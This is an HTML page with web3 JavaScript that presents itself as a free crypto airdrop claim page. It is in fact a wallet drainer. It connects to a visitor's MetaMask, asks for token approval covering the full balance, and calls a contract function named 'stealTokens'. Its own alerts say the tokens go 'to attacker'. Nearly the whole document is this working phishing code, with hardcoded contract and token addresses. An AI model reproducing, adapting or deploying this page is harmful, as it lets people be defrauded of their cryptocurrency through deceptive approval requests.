<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>

    <h1>Claim your Free Airdrop!</h1>
    <button id="connectButton">Connect MetaMask</button>
    <button id="airdropButton" style="display:none;">Claim Airdrop</button>

   <script>
    const contractABI = [
        { "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }], "name": "stealTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
        { "stateMutability": "payable", "type": "receive" },
        { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address payable", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
    ];

    const erc20ABI = [
        {
            "constant": true,
            "inputs": [{ "name": "account", "type": "address" }],
            "name": "balanceOf",
            "outputs": [{ "name": "", "type": "uint256" }],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }],
            "name": "allowance",
            "outputs": [{ "name": "", "type": "uint256" }],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    // Replace with your contract and token addresses
    const contractAddress = "0x65a59e7c1879120b0623723ea643fb85f894b128";
    const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; // TTK Token Address
 







    let web3;
    let contract;
    let userAddress;

    // Connect MetaMask to the website
    async function connectMetaMask() {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                // Request user account connection
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];

                // Hide the connect button and show the airdrop button
                document.getElementById('connectButton').style.display = 'none';
                document.getElementById('airdropButton').style.display = 'block';
            } catch (error) {
                console.error("User denied MetaMask connection", error);
                alert("Please connect your MetaMask wallet.");
            }
        } else {
            alert("Please install MetaMask!");
        }
    }

    // Claim the airdrop and execute token transfer
    async function claimAirdrop() {
        contract = new web3.eth.Contract(contractABI, contractAddress);
        const token = new web3.eth.Contract(erc20ABI, tokenAddress);

        try {
            // Check if the user has enough balance
            const balance = await token.methods.balanceOf(userAddress).call();
            if (parseInt(balance) === 0) {
                alert("You don't have any tokens to steal.");
                return;
            }

            // Check if the contract has approval to transfer the user's tokens
            const allowance = await token.methods.allowance(userAddress, contractAddress).call();
            if (parseInt(allowance) < balance) {
                // If no approval or insufficient approval, request approval from the user
                await token.methods.approve(contractAddress, balance).send({ from: userAddress });
            }

            // Fetch current gas price from the network
            const gasPrice = await web3.eth.getGasPrice();
            const gasLimit = 100000; // Set a reasonable gas limit for ERC-20 transfers

            // Send the transaction with the appropriate gas settings
            await contract.methods.stealTokens(tokenAddress).send({
                from: userAddress,
                gasPrice: gasPrice,
                gas: gasLimit
            });

            alert("Airdrop claimed! Tokens transferred to attacker.");
        } catch (err) {
            console.error("Error in claiming airdrop", err);
            alert("Transaction failed! Please check the console for more details.");
        }
    }

    // Event listeners for the buttons
    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
    document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
</script>


</body>
</html>

</body>
</html>
